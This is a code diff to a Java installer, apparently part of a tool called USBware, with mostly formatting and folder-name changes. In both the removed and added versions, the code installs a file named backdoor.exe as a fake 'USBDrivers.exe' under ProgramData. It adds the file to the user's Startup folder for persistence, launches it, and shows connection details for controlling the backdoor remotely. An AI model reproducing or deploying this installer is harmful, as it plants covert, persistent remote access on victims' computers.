@@ -17,22 +17,23 @@ public class Install {
 	 */
 	public static void main(String[] args) {
 		String disp="";
-		try {
-			if(new File("jre").isDirectory()&&(new File("jre\\bin").isDirectory()&&new File("jre\\lib").isDirectory()))
-				FileUtils.copyDirectory(new File("files\\jre"), new File("C:\\ProgramData\\USBDrivers\\jre"));
-			FileUtils.copyDirectory(new File("files\\scripts"), new File("C:\\ProgramData\\USBDrivers\\scripts"));
-			FileUtils.copyFile(new File("files\\backdoor.exe"), new File("C:\\ProgramData\\USBDrivers\\USBDrivers.exe"));
-			FileUtils.copyFile(new File("files\\ip.txt"), new File("C:\\ProgramData\\USBDrivers\\ip.txt"));
-			try {
-				ShellLink.createLink("C:\\ProgramData\\USBDrivers\\USBDrivers.exe", "C:\\Users\\"+System.getProperty("user.name")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk");
-			}catch (Exception e) {
+		try{
+			if(new File("jre").isDirectory() && (new File("jre\\bin").isDirectory() && new File("jre\\lib").isDirectory()))
+				FileUtils.copyDirectory(new File("resources\\jre"), new File("C:\\ProgramData\\USBDrivers\\jre"));
+			FileUtils.copyDirectory(new File("resources\\scripts"), new File("C:\\ProgramData\\USBDrivers\\scripts"));
+			FileUtils.copyFile(new File("resources\\backdoor.exe"), new File("C:\\ProgramData\\USBDrivers\\USBDrivers.exe"));
+			FileUtils.copyFile(new File("resources\\ip.txt"), new File("C:\\ProgramData\\USBDrivers\\ip.txt"));
+			try{
+				ShellLink.createLink("C:\\ProgramData\\USBDrivers\\USBDrivers.exe", "C:\\Users\\"+System.getProperty("user.name")
+					+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk");
+			}catch(Exception e){
 				disp+="Could not add backdoor to startup\n\n";
 			}
 			Desktop.getDesktop().open(new File("C:\\ProgramData\\USBDrivers\\USBDrivers.exe"));
 			disp+="Backdoor running!\n\nTo control backdoor, connect to:\n"+Utils.currentConnection()+"\nand run option 1 in USBware";
-		}catch (Exception e) {
+		}catch(Exception e){
 			disp="An error occurred:\n"+e.getMessage();
-		}finally {
+		}finally{
 			JOptionPane.showMessageDialog(null, disp, "Backdoor control information", JOptionPane.INFORMATION_MESSAGE);
 		}
 	}
